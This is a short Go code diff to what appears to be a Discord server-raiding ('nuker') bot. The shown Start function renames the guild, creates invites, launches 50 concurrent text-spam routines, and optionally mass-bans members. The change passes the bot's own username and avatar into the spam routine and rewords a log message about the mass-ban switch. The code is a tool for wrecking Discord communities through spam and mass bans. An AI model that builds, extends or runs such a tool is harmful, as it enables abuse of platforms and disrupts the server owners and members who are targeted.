@@ -72,6 +72,7 @@ func Start(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup)
 			start_end.Logs(s, m)
 			creating.GuildRename(s, m)
 
+
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
@@ -82,11 +83,13 @@ func Start(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup)
 
 			start_end.InviteCreate(s, m)
 
+			user, _ := s.User("@me")
+
 			for i := 0; i < 50; i++ {
 				wg.Add(1)
 				go func() {
 					defer wg.Done()
-					creating.TextSpam(s, m, wg)
+					creating.TextSpam(s, m, wg, user.Username, discordgo.EndpointUserAvatar(user.ID, user.Avatar))
 				}()
 			}
 			wg.Wait()
@@ -118,7 +121,7 @@ func Start(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup)
 				}()
 				wg.Wait()
 			} else {
-				fmt.Println("MASS_BAN not set or true, no mass ban initiated.")
+				fmt.Println("MASS_BAN is disabled, no mass ban initiated.")
 			}
 
 			wg.Add(1)
